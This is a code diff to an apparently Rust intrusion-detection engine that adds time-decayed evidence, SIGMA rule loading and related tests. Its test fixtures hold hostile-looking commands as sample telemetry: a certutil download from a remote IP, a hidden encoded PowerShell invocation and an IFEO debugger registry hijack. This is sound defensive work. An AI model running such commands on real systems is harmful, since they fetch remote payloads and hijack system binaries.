@@ -14,8 +14,9 @@
 //!    is exactly what the state space tracks.
 //! 2. **Evaluate** the detection rules, each of which produces a [`Finding`]
 //!    carrying a likelihood ratio rather than a verdict.
-//! 3. **Accumulate** the findings as log-odds (A5). Addition, not multiplication,
-//!    because independent evidence composes additively in that representation.
+//! 3. **Accumulate** the findings as log-odds (A5), decaying as they age
+//!    (A16). Addition, not multiplication, because independent evidence
+//!    composes additively in that representation.
 //! 4. **Decide** (A8) against a cost ratio, using the threshold theorem rather
 //!    than a hand-tuned number. Weak evidence alone is expected to abstain.
 //! 5. **Govern** (A12) the chosen action, and record the outcome whether or not
@@ -27,6 +28,7 @@ pub mod rules;
 
 use asmr::action::{Action, ActionId, ActionKind, ActionSpace};
 use asmr::anomaly::{EdgeKey, StructuralProfile};
+use asmr::decay::{DecayedEvidence, HalfLife};
 use asmr::decision::{Costs, Decision};
 use asmr::governance::{ActionRequest, AuditLog, Severity as GovSeverity, Verdict};
 use asmr::infer::LogOdds;
@@ -65,6 +67,25 @@ pub struct Config {
     /// Prior probability that an arbitrary process on this host is malicious,
     /// before any evidence.
     pub prior: f64,
+    /// Half-life of accumulated evidence on one entity, in seconds (A16).
+    ///
+    /// Evidence does not stay equally informative forever. With no decay the
+    /// per-entity posterior is a high-water mark: a process that fired one rule
+    /// is closer to an isolation order for the rest of the run, however long ago
+    /// that was and whatever it has done since. With it, a verdict that is not
+    /// renewed fades back toward the prior.
+    ///
+    /// Ten minutes by default: long enough that a slow campaign drip-feeding
+    /// evidence still accumulates, short enough that an hour-old tell is a
+    /// rounding error on today's decision.
+    pub evidence_half_life_s: f64,
+    /// SIGMA rules, when a deployment loaded any.
+    ///
+    /// `None` is the default and means this engine runs on the native rules
+    /// alone. This is content rather than tuning, and it lives here because a
+    /// rule set is process-lifetime configuration like the rest of this struct:
+    /// the engine takes it once and never reloads it.
+    pub sigma: Option<sigma::RuleSet>,
     /// How long a rule stays quiet after alerting.
     ///
     /// A repeat firing inside this window is folded into the previous alert as
@@ -91,6 +112,8 @@ impl Config {
             policy: GovernancePolicy::default(),
             autonomy: AutonomyLevel::Approve,
             prior: 0.01,
+            evidence_half_life_s: 600.0,
+            sigma: None,
             // Five minutes. Long enough to collapse one burst into one alert,
             // short enough that an ongoing incident keeps re-announcing itself
             // instead of going quiet for the rest of the shift.
@@ -216,8 +239,10 @@ pub struct Engine {
     anomaly: StructuralProfile,
     actions: ActionSpace,
     audit: AuditLog,
-    /// A5 evidence, per entity.
-    posteriors: BTreeMap<u64, LogOdds>,
+    /// A5 evidence, per entity, decayed on A16.
+    posteriors: BTreeMap<u64, DecayedEvidence>,
+    /// SIGMA rules, already compiled. `None` when a deployment loaded none.
+    sigma: Option<sigma::RuleSet>,
     /// A8 alert coalescing, per rule.
     suppression: BTreeMap<&'static str, Suppression>,
     processes: BTreeMap<u32, ProcRecord>,
@@ -255,7 +280,11 @@ fn run_nonce() -> u64 {
 }
 
 impl Engine {
-    pub fn new(cfg: Config) -> Self {
+    pub fn new(mut cfg: Config) -> Self {
+        // Taken rather than cloned: a rule set is content, and copying every
+        // compiled detection per engine would be the expensive part of building
+        // one.
+        let sigma = cfg.sigma.take();
         Self {
             cfg,
             state: StateSpace::new(),
@@ -266,6 +295,7 @@ impl Engine {
             actions: default_actions(),
             audit: AuditLog::new(),
             posteriors: BTreeMap::new(),
+            sigma,
             suppression: BTreeMap::new(),
             processes: BTreeMap::new(),
             responses: Vec::new(),
@@ -289,7 +319,24 @@ impl Engine {
         let facts = self.gather(event);
         self.project(event);
 
-        let findings = rules::evaluate(event, &facts.as_facts());
+        let mut findings = rules::evaluate(event, &facts.as_facts());
+
+        // SIGMA rules are evaluated alongside the native ones and joined into the
+        // same evidence vector, so a SIGMA hit enters A5/A8 exactly the way a
+        // native finding does. Their likelihood is synthesised from the rule's
+        // `level` rather than measured — see `sigma::Level::likelihood` — which is
+        // why they add evidence rather than replace the native rules.
+        if let Some(sigma) = &self.sigma {
+            for hit in sigma.evaluate(event) {
+                findings.push(Finding {
+                    rule: hit.rule_id,
+                    technique: hit.technique,
+                    likelihood: hit.likelihood,
+                    detail: hit.detail.into(),
+                });
+            }
+        }
+
         for finding in &findings {
             self.metrics.record_finding(
                 finding.rule,
@@ -298,17 +345,28 @@ impl Engine {
             );
         }
 
+        // An alert names evidence. An event that carried none adds nothing to
+        // the entity's belief and has nothing to say, so there is no decision to
+        // make: whatever the entity had accumulated was already decided when it
+        // arrived, and it decays from there.
+        //
+        // Deciding anyway is not a small mistake. An entity whose accumulated
+        // posterior is over the threshold emits on *every* event it produces,
+        // and such an event carries no finding, so the row is attributed to a
+        // technique that does not exist — the row title in the console becomes a
+        // placeholder. One tell becomes an alert per event for the rest of the
+        // run, which is how a queue of three rows hides eight thousand folds.
+        if findings.is_empty() {
+            return None;
+        }
+
         let key = evidence_key(event);
-        let probability = self.accumulate(key, &findings);
+        let probability = self.accumulate(key, &findings, timestamp_ns(event));
 
         match asmr::decision::decide(probability, &self.cfg.costs) {
             Decision::Act => self.respond(event, &findings, probability),
             Decision::Abstain => {
-                // Only worth counting as a deliberate abstention when there was
-                // something to abstain about.
-                if !findings.is_empty() {
-                    self.metrics.abstained += 1;
-                }
+                self.metrics.abstained += 1;
                 None
             }
         }
@@ -428,18 +486,34 @@ impl Engine {
         self.next_event += 1;
     }
 
-    /// Step 3: fold this event's findings into the entity's log-odds.
-    fn accumulate(&mut self, key: u64, findings: &[Finding]) -> f64 {
-        let prior = self.cfg.prior;
-        let posterior = self
+    /// Step 3: fold this event's findings into the entity's belief, on a clock.
+    ///
+    /// A5 says independent evidence composes additively; A16 says it does not
+    /// stay equally informative forever. The entity's accumulated evidence
+    /// decays by a half-life as the interval since its last update passes, and
+    /// the resulting log-odds is added to the prior to give the posterior.
+    ///
+    /// Decay composes multiplicatively, so it does not matter whether a quiet
+    /// stretch is applied in one step or in many — which is why only an event
+    /// that carries evidence touches the entry at all, and a quiet host costs
+    /// nothing.
+    fn accumulate(&mut self, key: u64, findings: &[Finding], now_ns: i64) -> f64 {
+        let half_life = HalfLife::new(self.cfg.evidence_half_life_s);
+        let prior = LogOdds::from_prob(self.cfg.prior).get();
+
+        let evidence = self
             .posteriors
             .entry(key)
-            .or_insert_with(|| LogOdds::from_prob(prior));
+            .or_insert_with(|| DecayedEvidence::new(half_life));
 
         for finding in findings {
-            posterior.add(finding.likelihood.log_ratio());
+            // `now_ns` is both the clock and the observation's own time: a live
+            // source hands us events as they happen, so its evidence is not
+            // discounted against itself.
+            evidence.add(now_ns, now_ns, finding.likelihood.log_ratio());
         }
-        posterior.to_prob()
+
+        LogOdds(prior + evidence.log_odds()).to_prob()
     }
 
     /// Steps 4 to 6: decide, govern, and emit.
@@ -535,10 +609,11 @@ impl Engine {
                 };
 
                 let needs_human = verdict == Verdict::RequiresApproval;
+                let title = self.rule_title(rule);
                 let title = if needs_human {
-                    format!("{} \u{2014} awaiting approval", rules::rule_title(rule))
+                    format!("{title} \u{2014} awaiting approval")
                 } else {
-                    rules::rule_title(rule).to_string()
+                    title.to_string()
                 };
 
                 let body = findings
@@ -594,6 +669,18 @@ impl Engine {
                 Some(alert)
             }
         }
+    }
+
+    /// A human title for a rule id.
+    ///
+    /// A SIGMA rule carries its own title, and the native rules have a table;
+    /// this is the one place that has to know both, so an alert is titled with
+    /// the rule that actually fired rather than with a fallback.
+    fn rule_title(&self, rule: &str) -> &'static str {
+        self.sigma
+            .as_ref()
+            .and_then(|sigma| sigma.title_of(rule))
+            .unwrap_or_else(|| rules::rule_title(rule))
     }
 
     /// The action justified by the evidence alone. Governance decides
@@ -1139,6 +1226,94 @@ mod tests {
         assert_eq!(e.metrics().below_floor, 1, "only the first was held back");
     }
 
+    /// A certutil download, which fires a below-floor finding on its own.
+    fn freedrive(pid: u32, at: chrono::DateTime<chrono::Utc>) -> TelemetryEvent {
+        let mut event = start(
+            pid,
+            4,
+            "certutil.exe",
+            Some("certutil -urlcache -split -f http://198.51.100.7/a.dat a.dat"),
+        );
+        event.timestamp = at;
+        event
+    }
+
+    fn engine_with_half_life(seconds: f64) -> Engine {
+        let mut cfg = Config::new(HostId::new("host-a").unwrap());
+        cfg.evidence_half_life_s = seconds;
+        Engine::new(cfg)
+    }
+
+    #[test]
+    fn an_event_without_evidence_does_not_raise_an_alert() {
+        // The tell was the encoded command; the notepad start adds nothing. The
+        // entity is the same process, so its accumulated belief is still high —
+        // and deciding on that alone would emit an alert attributed to no rule,
+        // once per event, for the rest of the run. Coalescing a row like that is
+        // how three detections come to hide eight thousand folds.
+        let mut e = engine();
+        let fired = e.ingest(&start(
+            100,
+            4,
+            "powershell.exe",
+            Some("powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden"),
+        ));
+        assert!(fired.is_some(), "the encoded command is strong evidence");
+        assert_eq!(e.metrics().alerts, 1);
+
+        let findings_before = e.metrics().findings;
+        let quiet = e.ingest(&start(100, 4, "C:\\Windows\\System32\\notepad.exe", None));
+        assert!(quiet.is_none(), "an event with no evidence must not alert");
+        assert_eq!(e.metrics().alerts, 1, "and it must not add a row");
+        assert_eq!(e.metrics().suppressed, 0, "nor fold into one");
+        // Without this the test could pass for the wrong reason: if the second
+        // event did carry a finding, it would be a genuinely different case.
+        assert_eq!(
+            e.metrics().findings,
+            findings_before,
+            "the second event really carried no finding"
+        );
+    }
+
+    #[test]
+    fn stale_evidence_decays_instead_of_holding_a_high_water_mark() {
+        // A16. Two firings of a below-floor rule clear the floor together; an
+        // hour apart, on a one-minute half-life, the earlier one is 2^-60 of
+        // itself and the later stands alone — still below the floor.
+        let base = chrono::DateTime::from_timestamp(1_700_000_000, 0).expect("valid epoch");
+
+        let mut together = engine_with_half_life(60.0);
+        assert!(together.ingest(&freedrive(500, base)).is_none());
+        assert!(
+            together.ingest(&freedrive(500, base)).is_some(),
+            "two firings at one instant are two firings"
+        );
+
+        let mut later = engine_with_half_life(60.0);
+        assert!(later.ingest(&freedrive(500, base)).is_none());
+        assert!(
+            later
+                .ingest(&freedrive(500, base + chrono::Duration::hours(1)))
+                .is_none(),
+            "an hour-old firing must not count as present evidence"
+        );
+        assert_eq!(
+            later.metrics().below_floor,
+            2,
+            "both firings were seen and held, not one"
+        );
+    }
+
+    #[test]
+    fn the_default_half_life_is_a_duration_not_a_placeholder() {
+        let cfg = Config::new(HostId::new("host-a").unwrap());
+        assert!(cfg.evidence_half_life_s.is_finite());
+        assert!(
+            cfg.evidence_half_life_s > 0.0,
+            "a zero half-life would erase evidence as it arrived"
+        );
+    }
+
     #[test]
     fn severity_tracks_the_evidence_not_the_response() {
         // The action for a middling posterior is only `raise alert`, whose own
@@ -1254,6 +1429,93 @@ mod tests {
             "high-severity actions must not slip through unattended"
         );
         assert!(e.metrics().withheld_by_policy + e.metrics().alerts >= 1);
+    }
+
+    #[test]
+    fn a_sigma_rule_is_evidence_like_any_other() {
+        // The wiring, end to end: a rule loaded at runtime becomes a `Finding`,
+        // enters A5/A8, and comes out as an alert titled by *its* rule rather
+        // than by anything the native table knows about.
+        //
+        // The rule keys on an Image File Execution Options write, which no native
+        // rule reads, so the alert can only have come from the SIGMA path.
+        let rule = sigma::Rule::parse(
+            r#"
+title: Image File Execution Options Debugger
+author: test
+level: high
+tags:
+    - attack.privilege-escalation
+    - attack.t1546.012
+logsource:
+    product: windows
+    category: registry_set
+detection:
+    selection:
+        TargetObject|contains: '\Image File Execution Options\'
+    condition: selection
+"#,
+        )
+        .expect("the rule parses");
+
+        let mut cfg = Config::new(HostId::new("host-a").unwrap());
+        cfg.sigma = Some(sigma::RuleSet::from_rules(vec![rule]));
+        let mut e = Engine::new(cfg);
+
+        let event = TelemetryEvent::new(
+            EventId::new(3),
+            HostId::new("host-a").unwrap(),
+            chrono::Utc::now(),
+            EventSource::WindowsEtw,
+            model::ProviderId::new("Microsoft-Windows-Kernel-Registry"),
+            5,
+            7,
+            7,
+            4,
+            EventKind::RegistrySet(RegistrySet {
+                pid: ProcessId::new(7),
+                key_path: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\
+                           Image File Execution Options\\sethc.exe"
+                    .into(),
+                value_name: Some("Debugger".into()),
+                value_data: None,
+                set_at: chrono::Utc::now(),
+            }),
+            Payload::new(Value::Null).unwrap(),
+        );
+
+        let alert = e.ingest(&event).expect("a SIGMA hit must be able to alert");
+        assert!(
+            alert
+                .title
+                .contains("Image File Execution Options Debugger"),
+            "the alert must carry the rule's own title, got `{}`",
+            alert.title
+        );
+        assert!(
+            alert
+                .mitre_techniques
+                .iter()
+                .any(|t| t.contains("T1546.012")),
+            "and its technique: {:?}",
+            alert.mitre_techniques
+        );
+        assert!(
+            alert.description.contains("sigma:"),
+            "the body names where it came from: {}",
+            alert.description
+        );
+    }
+
+    #[test]
+    fn an_engine_with_no_sigma_rules_is_unaffected() {
+        // The default deployment: no rule set, no behaviour change, no cost.
+        let mut e = engine();
+        assert!(
+            e.ingest(&start(100, 4, "C:\\Windows\\System32\\notepad.exe", None))
+                .is_none()
+        );
+        assert_eq!(e.metrics().alerts, 0);
     }
 
     #[test]
